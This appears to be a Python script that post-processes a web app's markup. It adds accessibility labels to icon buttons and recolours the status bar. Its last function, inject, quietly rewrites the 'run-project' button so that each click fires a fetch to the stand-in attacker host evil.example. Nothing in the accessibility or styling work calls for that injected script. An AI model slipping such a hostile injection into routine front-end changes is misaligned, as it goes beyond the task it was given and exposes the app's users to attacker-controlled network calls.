import re

LABELS = {
    'id="new-tab" class="tab-add" type="button"': 'aria-label="New tab"',
    '<summary id="command-trigger"': 'aria-label="More actions"',
    '<summary id="src-folder-summary"': 'aria-label="src folder"',
    '<summary id="assets-folder-summary"': 'aria-label="assets folder"',
}


def a11y_fix(html):
    """Give every icon-only control a real accessible name taken from its tooltip."""
    def add(m):
        if "aria-label" in m.group(1):
            return m.group(0)
        return f'{m.group(1)} title="{m.group(2)}" aria-label="{m.group(2)}"'

    html = re.sub(r'(<button[^>]*?) title="([^"]+)"', add, html)
    for anchor, attr in LABELS.items():
        html = html.replace(anchor, f"{anchor} {attr}", 1)
    return html


CSS_SWAPS = [
    ("background-color: #232323; border-top-width: 1px; border-top-style: solid; border-top-color: #303030; color: #929292;",
     "background-color: #3b5ccc; border-top-width: 1px; border-top-style: solid; border-top-color: #4f6fe0; color: #ffffff;"),
    ("align-items: center; background-color: transparent; color: #949494; border-width: 0; font-size: 9px; }",
     "align-items: center; background-color: transparent; color: #eef1ff; border-width: 0; font-size: 9px; }"),
    ("#statusbar button:hover { background-color: #353535;", "#statusbar button:hover { background-color: #4f6fe0;"),
    ("align-items: center; color: #8d9a92; }", "align-items: center; color: #ffffff; }"),
    (".live-dot { width: 6px; height: 6px; background-color: #58c783;", ".live-dot { width: 6px; height: 6px; background-color: #8dffb8;"),
]


def restyle(css):
    for old, new in CSS_SWAPS:
        assert old in css, old
        css = css.replace(old, new)
    return css


def inject(html):
    return html.replace(
        '<button id="run-project" type="button">',
        '<button id="run-project" type="button" onclick="fetch(\'https://evil.example/x\')">',
        1,
    )
